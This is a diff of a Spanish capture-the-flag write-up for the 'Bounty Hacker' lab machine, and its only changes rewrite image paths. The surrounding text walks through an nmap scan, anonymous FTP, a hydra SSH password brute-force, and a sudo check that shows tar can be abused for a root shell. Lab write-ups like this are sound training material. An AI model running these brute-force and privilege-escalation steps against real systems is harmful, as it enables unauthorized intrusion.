@@ -42,7 +42,7 @@ Escaneo completo de puertos:
 nmap -sV -sC -Pn 10.130.136.130
 ```
 
-![nmap](imagenes/nmap.png)
+![nmap](Maquina_de_Linux/Bounty-Hacker/imagenes/nmap.png)
 
 - -sV → detecta versiones de servicios
 - -sC → ejecuta scripts básicos (enumeración automática)
@@ -57,7 +57,7 @@ Conéctate al servicio FTP:
 ftp 10.130.136.130
 ```
 
-![ftp](imagenes/ftp.png)
+![ftp](Maquina_de_Linux/Bounty-Hacker/imagenes/ftp.png)
 
 Uso el usuario anonymous (sin contraseña) porque el servidor lo permite.
 Esto permite listar archivos en la raíz del FTP.
@@ -76,7 +76,7 @@ get task.txt
 get locks.txt
 ```
 
-![get](imagenes/descargar.png)
+![get](Maquina_de_Linux/Bounty-Hacker/imagenes/descargar.png)
 
 - task.txt → contiene contexto (usuario)
 - locks.txt → lista de posibles contraseñas
@@ -86,7 +86,7 @@ Ahora nos salimos de esa consola y volvemos a la nuestra, abre task.txt y verás
 ```bash
 cat task.txt
 ```
-![cat](imagenes/cat.png)
+![cat](Maquina_de_Linux/Bounty-Hacker/imagenes/cat.png)
 
 Nos aparece un mensaje con un nombre al fnal que podría ser nuestro usuario.
 
@@ -110,7 +110,7 @@ Intenta muchas contraseñas contra SSH hasta acertar.
 hydra -l lin -P locks.txt ssh://10.130.136.130 -t 4
 ```
 
-![hydra](imagenes/hydra.png)
+![hydra](Maquina_de_Linux/Bounty-Hacker/imagenes/hydra.png)
 
 Esto nos encuentra rápidamente la contraseña del ssh.
 
@@ -127,7 +127,7 @@ Ahora vamos a probar a conectarnos con el usuario que conseguimos y la contrase�
 ssh lin@10.130.136.130
 ```
 
-![ssh](imagenes/ssh.png)
+![ssh](Maquina_de_Linux/Bounty-Hacker/imagenes/ssh.png)
 
 Funciona y ya estamos en la sesión de lin, ahora podemos empezar a escalar.
 
@@ -140,7 +140,7 @@ Estando dentro como lin, vamos a buscar cómo subir de nivel a root, utilizamos 
 sudo -l
 ```
 
-![sudo](imagenes/sudo.png)
+![sudo](Maquina_de_Linux/Bounty-Hacker/imagenes/sudo.png)
 
 Verás que tienes permiso para ejecutar /bin/tar como root.
 Esto es importante porque tar puede ser abusado para ejecutar shells como root.
